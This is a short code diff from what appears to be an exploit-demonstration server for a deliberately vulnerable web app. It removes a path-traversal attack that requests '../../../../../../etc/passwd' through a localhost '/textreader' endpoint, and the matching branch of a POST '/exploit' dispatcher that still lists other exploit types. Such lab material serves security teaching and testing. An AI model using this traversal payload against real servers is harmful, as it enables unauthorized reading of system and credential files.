@@ -62,10 +62,6 @@ async function defaultCreds() {
   });
 }
 
-async function pathTraversal() {
-  return getReq('http://localhost:3001/textreader?fileName=../../../../../../etc/passwd');
-}
-
 async function productTampering() {
   try {
     const url = 'http://localhost:3000/api/products/9';
@@ -155,10 +151,7 @@ app.get('/textreader', (req, res) => {
 app.post('/exploit', async (req, res) => {
   let { exploitType } = req.body;
   try {
-    if (exploitType === "Path Traversal") {
-      let result = await pathTraversal();
-      res.send(result);
-    } else if (exploitType === "Default Credentials") {
+    if (exploitType === "Default Credentials") {
       let result = await defaultCreds();
       res.send(result);
     } else if (exploitType === "Software and Data Integrity Failures") {
